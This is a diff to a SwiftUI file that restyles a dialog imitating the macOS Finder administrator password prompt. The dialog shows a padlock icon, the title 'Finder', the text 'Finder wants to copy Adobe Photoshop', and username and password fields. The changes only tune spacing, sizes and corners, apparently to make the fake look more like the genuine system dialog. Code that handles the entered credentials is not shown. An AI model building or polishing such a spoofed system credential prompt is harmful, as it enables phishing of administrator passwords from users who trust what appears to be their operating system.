@@ -105,7 +105,7 @@ struct FinderPadlockIcon: View {
 }
 
 private let appleSystemBlue = Color(red: 0.0, green: 0.478, blue: 1.0)
-private let fieldAlpha: Double = 0.15
+private let fieldAlpha: Double = 0.08
 
 struct SecondaryButtonStyle: ButtonStyle {
     func makeBody(configuration: Configuration) -> some View {
@@ -113,8 +113,8 @@ struct SecondaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(.primary)
             .frame(maxWidth: .infinity)
-            .frame(height: 24)
-            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.14)))
+            .frame(height: 28)
+            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.08)))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.70 : 1.0)
     }
@@ -127,10 +127,10 @@ struct PrimaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(isActive ? .white : .primary)
             .frame(maxWidth: .infinity)
-            .frame(height: 24)
+            .frame(height: 28)
             .background(
                 Capsule(style: .continuous)
-                    .fill(isActive ? appleSystemBlue : Color.black.opacity(0.14))
+                    .fill(isActive ? appleSystemBlue : Color.black.opacity(0.08))
             )
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.80 : 1.0)
@@ -149,30 +149,30 @@ struct ContentView: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 12) // Reduced from 14
+                .padding(.bottom, 16) // Restored generous spacing
 
             Text("Finder")
-                .font(.system(size: 15, weight: .bold))
+                .font(.system(size: 13, weight: .bold)) // Smaller bold heading
                 .foregroundColor(.primary)
-                .padding(.bottom, 10) // Reduced from 14
+                .padding(.bottom, 12)
 
             Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
-                .padding(.bottom, 4) // Reduced from 8
+                .padding(.bottom, 6)
 
             Text("Enter an administrator\u{2019}s name and password to allow this.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
-                .lineSpacing(2)
+                .lineSpacing(3) // More line spacing
                 .fixedSize(horizontal: false, vertical: true)
-                .padding(.bottom, 10) // Reduced from 14
+                .padding(.bottom, 16)
 
             fieldContainer(text: $username, placeholder: "Username", secure: false, field: .username)
-                .padding(.bottom, 6) // Reduced from 8
+                .padding(.bottom, 10)
 
             fieldContainer(text: $password, placeholder: "Password", secure: true, field: .password)
-                .padding(.bottom, 12) // Reduced from 14
+                .padding(.bottom, 18)
 
             HStack(spacing: 12) {
                 Button("Cancel") { cancel() }
@@ -193,12 +193,12 @@ struct ContentView: View {
                 }
             }
         }
-        .padding(14) // Reduced from 20
-        .frame(width: 260) // Back to 260 to match width
+        .padding(20)
+        .frame(width: 280)
         .background(VisualEffectView(material: .popover))
-        .clipShape(RoundedRectangle(cornerRadius: 18, style: .continuous))
+        .clipShape(RoundedRectangle(cornerRadius: 24, style: .continuous)) // Rounder corners
         .overlay(
-            RoundedRectangle(cornerRadius: 18, style: .continuous)
+            RoundedRectangle(cornerRadius: 24, style: .continuous)
                 .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
         )
         .compositingGroup()
@@ -243,7 +243,7 @@ struct ContentView: View {
             .textFieldStyle(.plain)
             .font(.system(size: 13))
             .padding(.horizontal, 10)
-            .frame(height: 24)
+            .frame(height: 26) // Taller fields
             .focused($focusedField, equals: field)
             .disabled(isLoading)
             .onSubmit { submit() }
